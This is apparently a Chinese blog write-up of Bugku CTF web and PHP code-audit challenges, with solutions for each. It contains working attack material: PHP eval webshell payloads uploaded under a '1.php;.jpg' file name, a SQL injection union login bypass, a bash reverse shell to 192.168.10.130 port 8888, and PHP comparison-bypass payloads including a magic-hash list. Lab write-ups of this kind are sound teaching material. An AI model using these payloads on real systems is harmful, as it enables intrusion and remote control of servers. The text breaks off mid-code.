<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155308120.png" alt="image-20200614155308120"></p>
<p>F12查看源码，可以看到一个upload.php，访问这个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155405448.png" alt="image-20200614155405448"></p>
<p>可以看到是上传文件的，这里一看加上文件名就知道这里是文件上传漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155520631.png" alt="image-20200614155520631"></p>
<p>构造一句话木马，这里不能使用普通的一句话<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code>这个payload被过滤了，所以就要构造一个不被过滤的payload</p>
<p>payload：<code>&lt;?php &lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;cmd&#39;]) &lt;/script&gt; ?&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160404812.png" alt="image-20200614160404812"></p>
<p>复制payload，然后将文件后缀改为例：1.php;.jpg</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160104254.png" alt="image-20200614160104254"></p>
<p>上传，访问红线处的内容，查看页面是否返回空白，页面只有访问的时候是空白的时候才能使用蚁剑或者菜刀连接成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160510438.png" alt="image-20200614160510438"></p>
<p>复制链接，这里我使用的是蚁剑，使用蚁剑连接</p>
<p>先添加数据，将URL粘贴上，密码就是一句话中POST里面的自己设置的值，测试连接后左下角出现成功就点击添加</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160546779.png" alt="image-20200614160546779"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160700151.png" alt="image-20200614160700151"></p>
<p>双击进入，可以看到这个最长的，他的文件名也非常像flag，双击进去查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160724363.png" alt="image-20200614160724363"></p>
<p>发现flag确实在里面，复制提交就oK</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160809061.png" alt="image-20200614160809061"></p>
<p>还有一种方法将一句话构造成</p>
<p><code>&lt;?php &lt;script language=&#39;php&#39;&gt;system(&#39;ls&#39;)&lt;/script&gt; ?&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161500776.png" alt="image-20200614161500776"></p>
<p>还是将文件名改为1.php;.jpg</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161529154.png" alt="image-20200614161529154"></p>
<p>提交之后返回路径，复制访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161547711.png" alt="image-20200614161547711"></p>
<p>可以看到this_is_th3_F14g_154f65sd4g35f4d6f43.txt显示出来了，复制进行访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161620030.png" alt="image-20200614161620030"></p>
<p>访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt文件夹</p>
<p>成功返回falg</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161658497.png" alt="image-20200614161658497"></p>
<h4 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200230005.png" alt="image-20200614200230005"></p>
<p>查看原始页面</p>
<p>这里提交数据点击login是没有反应的，开始的时候题目给了提示hint，尝试给hint传参</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200300804.png" alt="image-20200614200300804"></p>
<p>给hint随机传参，都会返回源码，分析源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200354802.png" alt="image-20200614200354802"></p>
<p>源码</p>
<p>这里的$KEY是没有赋值的，不管最底下的$KEY，因为没有赋值说明当前$KEY为NULL，因为前面有unserialize函数进行反序列化，所以这是反序列化之后的值为NULL，也就是当ISecer全等于$KEY的时候返回flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line"># cookie等于ISecer</span><br><span class="line">$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];</span><br><span class="line"></span><br><span class="line"># 判断hint不能为空</span><br><span class="line">if(isset($_GET[&#39;hint&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 判断cookie也就是ISecer是否等于$KEY,等于输出flag</span><br><span class="line">elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>用在线php测试一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200945836.png" alt="image-20200614200945836"></p>
<p>复制上面的结果，然后因为之前ISecer是cookie的所以要再cookie中进行输入</p>
<p>使用burp抓包发送到repeater模块进行修改，然后运行，成功返回flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614201100734.png" alt="image-20200614201100734"></p>
<p>这里不嫩将cookie和上面回车空开一行，否则不出flag</p>
<p>例如：</p>
<p>以为cookie和上面回车空了一行所以断开了，没有执行cookie就结束了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614201150159.png" alt="image-20200614201150159"></p>
<h4 id="sql注入-2"><a href="#sql注入-2" class="headerlink" title="sql注入 2"></a>sql注入 2</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214134741.png" alt="image-20200528214134741"></p>
<p>原始页面，发现是登录界面，我们使用常用的弱口令试试能否登上，使用burp抓包一下，看看哪个是</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214112354.png" alt="image-20200528214112354"></p>
<p>抓包后非常绝望，发现除了admin其他都是一样的，我们除了admin挨个尝试一下试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214307661.png" alt="image-20200528214307661"></p>
<p>使用admin123，Wc，居然对了，登录进去了。。。。</p>
<p>可以看到输入框有个ls … 我们照着输入一下试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214350284.png" alt="image-20200528214350284"></p>
<p>输出后居然返回了flag。纯属蒙的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214512096.png" alt="image-20200528214512096"></p>
<p>手注</p>
<p>大佬的解题思路：<a href="https://blog.csdn.net/Mikasa_/article/details/87475337" target="_blank" rel="noopener">https://blog.csdn.net/Mikasa_/article/details/87475337</a></p>
<p>还有一个也是瞎猜出来的，就是在URL上输入flag会直接跳转页面，显示flag值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528220725088.png" alt="image-20200528220725088"></p>
<h4 id="孙XX的博客"><a href="#孙XX的博客" class="headerlink" title="孙XX的博客"></a>孙XX的博客</h4><h5 id="不会"><a href="#不会" class="headerlink" title="不会"></a>不会</h5><h4 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104358427.png" alt="image-20200615104358427"></p>
<p>查看原网址</p>
<p>这里注册也没有用，所以用御剑扫一下看看有没有有用的地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104501313.png" alt="image-20200615104501313"></p>
<p>可以看到扫到了一个show.php的地址，双击打开后发现flag就在里面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104638188.png" alt="image-20200615104638188"></p>
<p>复制提交就ok</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104715542.png" alt="image-20200615104715542"></p>
<h4 id="Bugku-CTF-login2-SKCTF"><a href="#Bugku-CTF-login2-SKCTF" class="headerlink" title="Bugku CTF login2(SKCTF)"></a>Bugku CTF login2(SKCTF)</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145248163.png" alt="image-20200615145248163"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145405953.png" alt="image-20200615145405953"></p>
<p>使用burp抓包发送到repeater模块运行，</p>
<p>可以看到有一串base64加密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145504301.png" alt="image-20200615145504301"></p>
<p>解密得到以下值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT username,password FROM admin WHERE username&#x3D;&#39;&quot;.$username.&quot;&#39;&quot;;</span><br><span class="line"></span><br><span class="line">if (!empty($row) &amp;&amp; $row[&#39;password&#39;]&#x3D;&#x3D;&#x3D;md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中的单双引号的嵌套，其中username和password列名在数据库中是存字符串的，而字符串是需要用引号引起来的，不然会出错，这个时候最外面的双引号是具有解析变量的作用，而里面的单引号是给数据库语句用的，如果里面再用双引号就会跟最外面的双引号起冲突了，故用单引号。</p>
<p>这告诉我们要登录要满足的条件：查询结果不为空，其次，输入的password的值要等于md5(password)。</p>
<p>例：<code>username=adminadsadaw&#39; union select 1,md5(1)#&amp;password=1</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155619788.png" alt="image-20200615155619788"></p>
<p>这样就能用后台数据库中并不存在的密码来绕过并登录成功：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155557851.png" alt="image-20200615155557851"></p>
<p>下面进入一个命令执行的页面：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155646518.png" alt="image-20200615155646518"></p>
<p>采用的反弹shell来做的。</p>
<p>反弹shell需要有公网ip，我们假设有个公网ip192.168.10.130，不用公网ip的话就线下赛局域网做题也行。</p>
<p>输入bash -i &gt;&amp; /dev/tcp/192.168.10.130/8888 0&gt;&amp;1并执行，然后在kali上运行命令：nc -lvp 8888，就能进行连接了，找到flag文件就拿到flag了。<br>原文链接：<a href="https://blog.csdn.net/zz_Caleb/java/article/details/89054600" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/java/article/details/89054600</a></p>
<h4 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h4><p>具体步骤在这个网址：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80667775" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80667775</a></p>
<h5 id="文件上传2（湖湘杯）"><a href="#文件上传2（湖湘杯）" class="headerlink" title="文件上传2（湖湘杯）"></a>文件上传2（湖湘杯）</h5><h5 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h5><h5 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h5><h4 id="Web进阶"><a href="#Web进阶" class="headerlink" title="Web进阶"></a>Web进阶</h4><h5 id="phpcmsV9"><a href="#phpcmsV9" class="headerlink" title="phpcmsV9"></a>phpcmsV9</h5><p>打开页面，从字面意思上就可以看出，这是要进行后台扫描。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172809843.png" alt="image-20200715172809843"></p>
<p>可能是我卡的原因，页面显示不全，这并无大碍</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172848323.png" alt="image-20200715172848323"></p>
<p>使用dirsearch进行目录扫描。</p>
<p><code>python3 dirsearch -u http://123.206.87.240:8001/ -e php</code></p>
<p>其中扫描出rebots.txt，其中1.php是返回phpinfo。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172926781.png" alt="image-20200715172926781"></p>
<p>在url后打开robots.txt。可以看到flag就在其中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715173106341.png" alt="image-20200715173106341"></p>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><h5 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h5><p>源码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag=<span class="string">'xxx'</span>;</span></span><br><span class="line"><span class="meta">extract($</span><span class="bash">_GET); </span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">shiyan)) &#123; <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>)); <span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>) &#123;</span></span><br><span class="line">echo'flag&#123;xxx&#125;';</span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">echo'Oh.no';</span><br><span class="line">&#125; </span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>白话代码：<br>一个名叫flag的变量等于‘xxx’<br>将通过GET传过来的数组转为一个名为数组名，值为数组值的变量(如果新的变量和已有变量重名，会将已有变量替换)<br>如果存在一个名叫shiyan的字符串<br>将flag变量的值赋给名为content变量<br>如果变量shiyan和变量content的值相同，<br>就输出flag的值<br>否则就输出Oh,no<br>因为extract()会把符号表中已存在的变量名的值替换掉，所以制造Payload ：?shiyan=&amp;flag=<br>也就是利用新传入的值为空的flag替换原有的flag的值。构造空等于空，成功输出flag的值</p>
<h5 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h5><p>源码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span></span><br><span class="line">if (isset($_GET['a'])) &#123;</span><br><span class="line">if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">print 'No';</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到注释，如果两者相等返回0，可以使用数组，来将其判断成0</p>
<p>payload:<code>http://123.206.87.240:9009/6.php?a[]=1</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084441132.png" alt="image-20200716084441132"></p>
<h5 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h5><p>源码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi("hackerDJ",$_GET[id])) &#123; echo("not allowed!");</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">_GET[id] = urldecode(<span class="variable">$_GET</span>[id]);</span></span><br><span class="line"><span class="meta">if($</span><span class="bash">_GET[id] == <span class="string">"hackerDJ"</span>)&#123;</span></span><br><span class="line">echo "Access granted!"; </span><br><span class="line">echo "flag";</span><br><span class="line">&#125;?</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到题目就已经给提示了，说了两次url编码，复制hackerDJ，在小葵工具，或者在线工具中进行两次URL编码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084821436.png" alt="image-20200716084821436"></p>
<p>复制提交以下</p>
<p>payload：<code>http://123.206.87.240:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084903971.png" alt="image-20200716084903971"></p>
<h5 id="MD5-函数"><a href="#MD5-函数" class="headerlink" title="MD5()函数"></a>MD5()函数</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line">if (isset($_GET['username']) and isset($_GET['password'])) &#123;</span><br><span class="line">if ($_GET['username'] == $_GET['password'])</span><br><span class="line">print 'Your password can not be your username.';</span><br><span class="line">else if (md5($_GET['username']) === md5($_GET['password']))</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">print 'Invalid password';</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，其中有这样一条判断，进行md5判断，要username和password全等于。所以这里要是用数组绕过，因为md5不能处理数组</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">else if (md5($_GET['username']) === md5($_GET['password']))</span><br></pre></td></tr></table></figure>

<p>payload:<code>http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716085249876.png" alt="image-20200716085249876"></p>
<h5 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h5><p>源码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"flag"</span>;</span></span><br><span class="line">if (isset($_GET['name']) and isset($_GET['password']))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">_GET[<span class="string">'name'</span>]);</span></span><br><span class="line">echo "</span><br><span class="line">";</span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">_GET[<span class="string">'password'</span>]);</span></span><br><span class="line"><span class="meta">var_dump(sha1($</span><span class="bash">_GET[<span class="string">'name'</span>]));</span></span><br><span class="line"><span class="meta">var_dump(sha1($</span><span class="bash">_GET[<span class="string">'password'</span>]));</span></span><br><span class="line">if ($_GET['name'] == $_GET['password'])</span><br><span class="line">echo '</span><br><span class="line">Your password can not be your name!</span><br><span class="line">';</span><br><span class="line">else if (sha1($_GET['name']) === sha1($_GET['password']))</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">echo '</span><br><span class="line">Invalid password.</span><br><span class="line">';</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo '</span><br><span class="line">Login first!</span><br><span class="line">';</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>打开页面，先构造一下看看页面返回</p>
<p>如果name和password相同就会返回你的名字不能和密码相同</p>
<p>并且将用户名和密码进行md5加密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140506785.png" alt="image-20200716140506785"></p>
<p>将用户名和密码输入不同的数字，就会返回密码无效</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140702144.png" alt="image-20200716140702144"></p>
<p>审计源码</p>
<p>发现name和password进行sha()函数比较，并且要求全等于，所以就可以利用数组绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140834651.png" alt="image-20200716140834651"></p>
<h5 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">md51 = md5(<span class="string">'QNKCDZO'</span>);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">a = @<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">md52 = @md5(<span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">a))&#123;</span></span><br><span class="line">if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">echo "flag&#123;*&#125;";</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo "false!!!";</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo "please input a";&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>打开页面，让其输入a</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142456628.png" alt="image-20200716142456628"></p>
<p>在url中输入a，审计源码发现，不能直接输入QNKCDZO</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142551180.png" alt="image-20200716142551180"></p>
<p>输入s878926199a，返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142642496.png" alt="image-20200716142642496"></p>
<p>原理：</p>
<p>​        PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。而以下这些字符串，md5哈希之后都是0e开头的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a	</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>

<h5 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">one = ord(<span class="string">'1'</span>); //ord — 返回字符的 ASCII 码值</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">nine = ord(<span class="string">'9'</span>); //ord — 返回字符的 ASCII 码值</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">number = <span class="string">'3735929054'</span>;</span></span><br><span class="line">// Check all the input characters!</span><br><span class="line">	for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">	&#123;</span><br><span class="line">		// Disallow all the digits!</span><br><span class="line"><span class="meta">		$</span><span class="bash">digit = ord(<span class="variable">$temp</span>&#123;<span class="variable">$i</span>&#125;);</span></span><br><span class="line">		if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line">	return "flase";</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">if($</span><span class="bash">number == <span class="variable">$temp</span>)</span></span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">temp = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span></span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">deadc0de</span><br></pre></td></tr></table></figure>

<p>打开页面查看返回，页面返回空白卡</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716144052143.png" alt="image-20200716144052143"></p>
<p>审计代码，数字不能是1~9，这和3735929054冲突，题目也告诉了用十六进制绕过，将3735929054进行转化，转换成十六进制，前面要加上0x，不然它不知道这个是什么。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716144253333.png" alt="image-20200716144253333"></p>
<h5 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h5><p>打不开</p>
<h5 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"xxx"</span>;</span></span><br><span class="line">if (isset ($_GET['password']))</span><br><span class="line">&#123;</span><br><span class="line">if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo '</span><br><span class="line">You password must be alphanumeric</span><br><span class="line">';</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die('Flag: ' . 